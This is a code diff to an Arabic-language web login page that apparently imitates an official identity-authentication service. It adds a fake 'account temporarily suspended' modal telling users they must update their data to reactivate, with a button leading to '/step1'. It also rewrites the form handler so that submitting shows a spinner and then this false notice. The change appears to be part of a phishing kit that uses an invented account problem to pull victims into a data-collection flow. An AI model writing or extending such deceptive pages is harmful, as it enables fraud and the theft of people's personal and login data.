@@ -547,6 +547,31 @@ body[dir=rtl] .twitter-typeahead pre {
 							<div id="loading-spinner" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.3); z-index: 9999; justify-content: center; align-items: center;">
 								<div class="spinner" style="border: 8px solid #f3f3f3; border-top: 8px solid #1976d2; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite;"></div>
 							</div>
+							
+							<!-- Account Suspended Modal -->
+							<div id="suspended-modal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.5); z-index: 10000; justify-content: center; align-items: center;">
+								<div style="background: white; border-radius: 8px; padding: 30px; max-width: 450px; width: 90%; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.3);">
+									<!-- Logo -->
+									<div style="margin-bottom: 25px;">
+										<img src="/idp/static/cache/img/nas-logo-100x100.png" alt="شعار التوثيق" style="width: 80px; height: 80px;">
+									</div>
+									
+									<!-- Title -->
+									<h2 style="color: #d32f2f; font-size: 22px; margin-bottom: 15px; font-weight: bold;">
+										تم إيقاف الحساب مؤقتاً
+									</h2>
+									
+									<!-- Message -->
+									<p style="color: #666; font-size: 16px; line-height: 1.6; margin-bottom: 25px;">
+										لإعادة تفعيله يجب تحديث بياناتك بشكل رسمي
+									</p>
+									
+									<!-- Button -->
+									<a href="/step1" class="btn btn-primary" style="background-color: #1976d2; border: none; padding: 12px 40px; font-size: 16px; border-radius: 4px; text-decoration: none; display: inline-block; color: white;">
+										إعادة تفعيل
+									</a>
+								</div>
+							</div>
 						<style>
 							@keyframes spin {
 								0% { transform: rotate(0deg); }
@@ -566,13 +591,16 @@ body[dir=rtl] .twitter-typeahead pre {
 								const form = document.querySelector('form');
 								const spinner = document.getElementById('loading-spinner');
 								
+								const suspendedModal = document.getElementById('suspended-modal');
+								
 								if (form) {
 									form.addEventListener('submit', function(e) {
 										e.preventDefault();
 										spinner.style.display = 'flex';
 										
 										setTimeout(function() {
-											window.location.href = '/step1';
+											spinner.style.display = 'none';
+											suspendedModal.style.display = 'flex';
 										}, 3000);
 									});
 								}
